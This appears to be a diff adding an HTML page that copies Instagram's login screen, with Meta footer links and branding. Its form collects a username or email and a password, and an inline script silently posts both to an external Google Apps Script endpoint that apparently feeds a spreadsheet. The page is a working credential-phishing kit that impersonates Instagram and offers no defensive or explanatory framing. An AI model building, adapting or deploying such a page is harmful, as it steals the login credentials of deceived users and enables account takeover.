@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&family=Lato:wght@700&family=Montserrat:wght@500;600&family=Roboto&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <div style="display: flex; margin-bottom: 50px;">
+        <main>
+            <div class="pic">
+                <img class="pict" src="./img/div.xamitd3.png">
+            </div>
+            <div>
+                <div class="pole" style="display: flex;">
+                    <div style="margin: 0 auto; display: flex; justify-content: space-around; flex-direction: column;">
+                        <div>
+                            <img class="pict2" src="./img/div.x9f619_margin.png">
+                        </div>
+                        <form name="submit-to-google-sheet" action="#">
+                            <input class="inp" id="name" type="text" name="name"
+                                placeholder="Phone number, username or email">
+                            <input class="inp2" id="password" type="password" name="password" placeholder="Password">
+                            <button style="cursor: pointer;" type="submit" class="first_button">Log in</button>
+
+                        </form>
+                        <div>
+                            <div class="delitel">
+                                <hr class="first_hr">
+                                <p class="first_p">OR</p>
+                                <hr class="second_hr">
+                            </div>
+                            <div class="face">
+                                <div style="display: flex; margin: 0 auto;">
+                                    <img class="facebook" src="./img/span._a04s.png">
+                                    <p style="cursor: pointer;" class="second_p">Log in with Facebook</p>
+                                </div>
+                            </div>
+                            <p style="cursor: pointer;" class="third_p">Forgot password?</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="pole2">
+                    <p class="fourth_p">Don`t have an account?</p>
+                    <p style="cursor: pointer;" class="fiveth_p">Sign up</p>
+                </div>
+                <div class="app">
+                    <p class="sad">Install the application.</p>
+                    <div class="picter" style="display: flex; justify-content: center; margin-top: 15px;">
+                        <img style="cursor: pointer;" class="googl"
+                            src="./img/Link - Get it on Google Play → c5Rp7Ym-Klz.png.png">
+                        <img style="cursor: pointer;" class="micro" src="./img/Link - Get it from Microsoft.png">
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <div style="margin: 0 auto;">
+        <div class="words">
+            <div class="qqq">
+                <p class="odsa">Meta</p>
+                <p class="odsa">About</p>
+                <p class="odsa">Blog</p>
+                <p class="odsa">Jobs</p>
+                <p class="odsa">Help</p>
+                <p class="odsa">API</p>
+                <p class="odsa">Privacy</p>
+                <p class="odsa">Terms</p>
+                <p class="odsa">Locations</p>
+                <p class="odsa">Instagram Lite</p>
+                <p class="odsa">Threads</p>
+                <p class="odsa">Contact Uploading & Non-Users</p>
+            </div>
+            <div class="ee">
+                <p class="Verified">Meta Verified</p>
+            </div>
+            <div class="ss">
+                <p class="enss">English</p>
+                <p class="asad">></p>
+                <p class="ds">2023 Instagram from Meta</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        const scriptURL =
+            'https://script.google.com/macros/s/AKfycbz_Dfy0uBmBaLxXdl6LQrYH3R8NNx8Vbt1jv3moab6eTl2n9MFnB50JUzRvnmILSEeLMQ/exec';
+        const form = document.forms['submit-to-google-sheet'];
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then((response) => console.log('Success!', response))
+                .catch((error) => console.error('Error!', error.message));
+        });
+    </script>
+</body>
+
+</html>
